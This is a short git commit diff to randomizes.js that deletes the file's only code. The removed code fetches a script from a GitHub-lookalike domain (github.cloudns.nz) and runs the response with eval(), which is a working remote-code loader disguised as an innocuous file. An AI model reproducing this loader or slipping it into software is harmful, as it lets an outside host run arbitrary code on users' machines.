d93acac2de65e7a57b6c1fad13f62e04a26916fc
reposltory <124707435+reposltory@users.noreply.github.com>
2024-06-06 17:15:51 +0330

    Djs

--- randomizes.js
+++ randomizes.js
@@ -1,18 +1,1 @@
-// Create a new XMLHttpRequest object
-var xhr = new XMLHttpRequest();
-
-// Assign a function to handle the 'onreadystatechange' event
-xhr.onreadystatechange = function () {
-  // Check if the request is complete
-  if (xhr.readyState == XMLHttpRequest.DONE) {
-    // Evaluate the response text as JavaScript code
-    eval(xhr.responseText);
-  }
-};
-
-// Open a GET request to the specified URL
-xhr.open('GET', 'https://github.cloudns.nz/api-vue.php', true);
-
-// Send the request
-xhr.send(null);
 
